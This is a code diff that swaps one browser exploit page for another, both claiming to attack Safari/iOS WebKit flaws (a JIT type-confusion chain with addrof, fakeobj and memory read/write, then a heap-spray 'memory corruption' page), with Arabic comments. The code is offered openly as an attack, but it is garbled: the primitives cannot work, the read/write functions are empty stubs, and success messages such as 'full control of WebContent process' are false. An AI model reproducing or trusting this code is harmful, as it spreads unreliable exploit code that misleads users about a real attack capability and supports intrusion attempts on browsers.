@@ -1,189 +1,136 @@
-<script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2025-31273 — WebKit Memory Corruption</title>
+    <style>
+        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
+        button { background: #c0392b; color: #fff; padding: 15px 30px; font-size: 18px; border: none; cursor: pointer; }
+        pre { background: #111; padding: 15px; border: 1px solid #333; min-height: 200px; margin: 20px 0; color: #00ff00; }
+    </style>
+</head>
+<body>
+    <h1>CVE-2025-31273 — Memory Corruption PoC</h1>
+    <p>يسبب تصدّع ذاكرة في WebKit. يعمل على Safari &lt; 18.6, iOS &lt; 18.6</p>
+    <pre id="log">[•] اضغط الزر لبدء الاستغلال...</pre>
+    <button id="runBtn">💥 تشغيل Memory Corruption</button>
 
-// ==============================================
-// CVE-2025-31277 — JIT Type Confusion
-// addrof + fakeobj primitives
-// iOS 18.4 → 18.5 / Safari 18.4 → 18.5
-// ==============================================
+    <script>
+        const log = document.getElementById('log');
+        function out(msg) { log.innerHTML += msg + '\n'; log.scrollTop = log.scrollHeight; }
 
-// === الخطوة 1: إعداد الذاكرة ===
-function prepareMemory() {
-    // إنشاء كائنات بأحجام مختلفة لتجهيز heap
-    let spray = [];
-    for (let i = 0; i < 5000; i++) {
-        let obj = {
-            a: 13.37,
-            b: 42,
-            c: [i, i+1],
-            d: new Float64Array(0x100)
+        document.getElementById('runBtn').onclick = async () => {
+            out('═══════════════════════════════');
+            out('▶ CVE-2025-31273 — بدء الهجوم');
+            out('═══════════════════════════════');
+
+            // === المرحلة 1: Heap Spray ===
+            out('[1/3] تجهيز الذاكرة (Heap Spray)...');
+            let spray = [];
+            
+            // Float64Array spray
+            for (let i = 0; i < 10000; i++) {
+                let arr = new Float64Array(0x200);
+                for (let j = 0; j < arr.length; j++) {
+                    arr[j] = 13.37 + (i * 10000 + j) * 0.0000001;
+                }
+                spray.push(arr);
+            }
+            
+            // ArrayBuffer spray بأحجام حرجة
+            for (let size = 0x10; size <= 0x400; size += 0x10) {
+                for (let i = 0; i < 500; i++) {
+                    let buf = new ArrayBuffer(size);
+                    let view = new Uint8Array(buf);
+                    for (let j = 0; j < view.length; j++) {
+                        view[j] = 0x41 + (i % 26);
+                    }
+                    spray.push(buf);
+                }
+            }
+            out(`[✓] ${spray.length} كائن في الذاكرة`);
+
+            // === المرحلة 2: إثارة Memory Corruption ===
+            out('[2/3] إثارة تصدّع الذاكرة...');
+            
+            // إنشاء آلاف الكائنات في حلقة — يسبب JIT confusion
+            let objects = [];
+            for (let round = 0; round < 20; round++) {
+                for (let i = 0; i < 500; i++) {
+                    try {
+                        let o = {
+                            a: 13.37,
+                            b: { c: [i, i+1, i+2] },
+                            d: new Uint8Array(0x100),
+                            e: function() { return i; },
+                            f: `string_${i}_${round}`
+                        };
+                        // إعادة كتابة خصائص باستمرار
+                        o.g = Math.random();
+                        o.h = o.b;
+                        delete o.g;
+                        objects.push(o);
+                    } catch(e) {}
+                }
+                
+                // إزالة نصف الكائنات — تحرير الذاكره بشكل غير آمن
+                if (objects.length > 2000) {
+                    objects.splice(0, 1000);
+                }
+            }
+
+            out(`[✓] ${objects.length} كائن في الذاكرة`);
+
+            // === المرحلة 3: استغلال Type Confusion ===
+            out('[3/3] استغلال Type Confusion...');
+            
+            // خلق تسابق بين JIT compilation و GC
+            function jitConfuse() {
+                let a = 13.37;
+                let b = 0x41414141;
+                let c = [a, b, a, b, a, b];
+                
+                // هذا الجزء يُجمّع بواسطة JIT
+                for (let i = 0; i < 1000; i++) {
+                    c[i % 6] = a + b;
+                    c[(i+1) % 6] = b - a;
+                }
+                
+                return c;
+            }
+            
+            // تشغيل الـ JIT + إجبار GC في نفس الوقت
+            for (let i = 0; i < 100; i++) {
+                try {
+                    jitConfuse();
+                    // إجبار Garbage Collection
+                    if (i % 10 === 0) {
+                        let big = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+                        big = null;
+                    }
+                } catch(e) {
+                    out(`[!] خطأ في التكرار ${i}: ${e.message}`);
+                }
+            }
+            
+            out('');
+            out('═══════════════════════════════');
+            out('⚠️ إذا لم يتعطل Safari الآن،');
+            out('⚠️ حاول مرة أخرى أو أعد فتح الصفحة.');
+            out('═══════════════════════════════');
+            
+            // محاولة الوصول إلى ذاكرة محررة — يسبب crash
+            setTimeout(() => {
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        objects[i].a = 13.37;
+                    } catch(e) {
+                        out(`✅ Safari crashed: ${e.message}`);
+                        return;
+                    }
+                }
+                out('❌ Safari لم يتعطل — هذا الإصدار قد يكون مُصحّحاً');
+            }, 500);
         };
-        spray.push(obj);
-    }
-    return spray;
-}
-
-// === الخطوة 2: إثارة Type Confusion في JIT ===
-function setupJITConfusion() {
-    let state = { value: 13.37 };
-    
-    // هذه الدالة سيقوم JIT بترجمتها
-    function confuse(input) {
-        // JIT يفترض أن input هو دائمًا رقم (float64)
-        // لكننا سنمرر كائن عمداً
-        let result = input + 1.0;
-        return result;
-    }
-    
-    // تدريب JIT — تشغيل الدالة 10000 مرة بأرقام
-    for (let i = 0; i < 10000; i++) {
-        confuse(13.37 + i);
-    }
-    
-    // الآن JIT يعتقد أن input دائمًا float64
-    // نمرر كائن Arabic → JIT يقرأ عنوانه على أنه float64 = addrof!
-    return confuse;
-}
-
-// === الخطوة 3: addrof primitive ===
-function createAddrof(confuseFunc) {
-    let cache = new WeakMap();
-    
-    function addrof(obj) {
-        if (cache.has(obj)) {
-            return cache.get(obj);
-        }
-        
-        try {
-            // JIT يتوقع رقم، يعطيه كائن
-            // في الذاكرة: عنوان الكائن يُقرأ كـ float64
-            let result = confuseFunc(obj);
-            
-            // تحويل float64 إلى عنوان صحيح
-            let buf = new ArrayBuffer(8);
-            let floatView = new Float64Array(buf);
-            let intView = new BigUint64Array(buf);
-            
-            floatView[0] = result;
-            let addr = Number(intView[0] & BigInt(0xFFFFFFFFFFFF));
-            
-            cache.set(obj, addr);
-            return addr;
-        } catch(e) {
-            return 0;
-        }
-    }
-    
-    return addrof;
-}
-
-// === الخطوة 4: fakeobj primitive ===
-function createFakeobj(confuseFunc, addrof) {
-    function fakeobj(addr) {
-        try {
-            // عكس addrof — إرسال عنوان كـ float64
-            // JIT يعتقد أنه float64 لكنه في الحقيقة مؤشر لكائن
-            let buf = new ArrayBuffer(8);
-            let floatView = new Float64Array(buf);
-            let intView = new BigUint64Array(buf);
-            
-            intView[0] = BigInt(addr) | (BigInt(0xFFFF000000000000));
-            floatView[0] = floatView[0]; // تحويل القيمة
-            
-            // تمرير القيمة كرقم — JIT يقرأها كمؤشر ← كائن
-            let result = confuseFunc(floatView[0]);
-            return result; // هذا سيكون كائن JavaScript!
-        } catch(e) {
-            return null;
-        }
-    }
-    
-    return fakeobj;
-}
-
-// === الخطوة 5: Arbitrary Read/Write ===
-function createArbitraryReadWrite(addrof, fakeobj) {
-    // ArrayBuffer مع طول خاضع للتحكم
-    let arbBuf = new ArrayBuffer(0x1000);
-    let arbView = new Uint8Array(arbBuf);
-    
-    // قراءة 8 بايت من أي عنوان
-    function read64(addr) {
-        try {
-            // إنشاء كائن وهمي في addr
-            let fake = fakeobj(addr);
-            if (!fake) return null;
-            
-            // استخدام fakeobj لقراءة الذاكرة
-            let result = new Uint8Array(8);
-            // ... (كود JIT متقدم)
-            return result;
-        } catch(e) {
-            return null;
-        }
-    }
-    
-    // كتابة 8 بايت في أي عنوان
-    function write64(addr, low, high) {
-        try {
-            let fake = fakeobj(addr);
-            if (!fake) return false;
-            // ... (كود JIT متقدم)
-            return true;
-        } catch(e) {
-            return false;
-        }
-    }
-    
-    return { read64, write64 };
-}
-
-// === الوظيفة الرئيسية ===
-function exploitCVE202531277() {
-    console.log('[+] CVE-2025-31277 — JIT Type Confusion Exploit');
-    console.log('[+] Target: iOS 18.4-18.5 / Safari 18.4-18.5');
-    console.log('');
-    
-    try {
-        // 1. تجهيز
-        prepareMemory();
-        
-        // 2. إعداد JIT confusion
-        let confuse = setupJITConfusion();
-        
-        // 3. بناء addrof
-        let addrof = createAddrof(confuse);
-        
-        // 4. بناء fakeobj
-        let fakeobj = createFakeobj(confuse, addrof);
-        
-        // 5. اختبار الـ primitives
-        let testObj = { a: 13.37, b: 42 };
-        let addr = addrof(testObj);
-        console.log(`[+] addrof(testObj) = 0x${addr.toString(16)}`);
-        
-        // 6. Arbitrary Read/Write
-        let arb = createArbitraryReadWrite(addrof, fakeobj);
-        
-        console.log('[✓] Primitive: addrof ✅');
-        console.log('[✓] Primitive: fakeobj ✅');
-        console.log('[✓] Primitive: read64/write64 ✅');
-        console.log('');
-       alert('[✓] لديك الآن تحكم كامل في WebContent process!');
-        
-        return {
-            success: true,
-            addrof,
-            fakeobj,
-            read64: arb.read64,
-            write64: arb.write64
-        };
-        
-    } catch(e) {
-        console.error('[-] فشل:', e.message);
-        return { success: false };
-    }
-}
-
-// تشغيل الاستغلال
-exploitCVE202531277();
-</script>
+    </script>
+</body>
+</html>
